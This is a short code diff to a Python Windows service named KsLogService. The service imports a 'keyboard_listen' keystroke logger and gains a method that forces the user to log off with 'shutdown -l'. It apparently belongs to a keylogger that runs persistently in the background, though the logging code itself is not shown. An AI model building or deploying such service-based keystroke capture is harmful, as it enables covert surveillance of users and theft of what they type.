@@ -1,3 +1,4 @@
+import newestbio.main
 import pywin.framework
 import pywin32_system32
 import pywin
@@ -6,8 +7,10 @@ import win32event
 import win32service
 import socket
 import servicemanager
-
+import os
 from logger import keyboard_listen
+
+
 class KsLogService(win32serviceutil.ServiceFramework):
     """base class to create a windows service python"""
     
@@ -26,7 +29,11 @@ class KsLogService(win32serviceutil.ServiceFramework):
         win32serviceutil.ServiceFramework.__init__(self,args)
         self.hWaitStop = win32event.CreateEvent(None,0,0,None)
         socket.setdefaulttimeout(60)
-    
+    def logout(self):
+        '''
+        Logout the user on the host machine.
+        '''
+        os.system('shutdown -l')
     def SvcStop(self):
         '''
         Called when the service is asked to stop
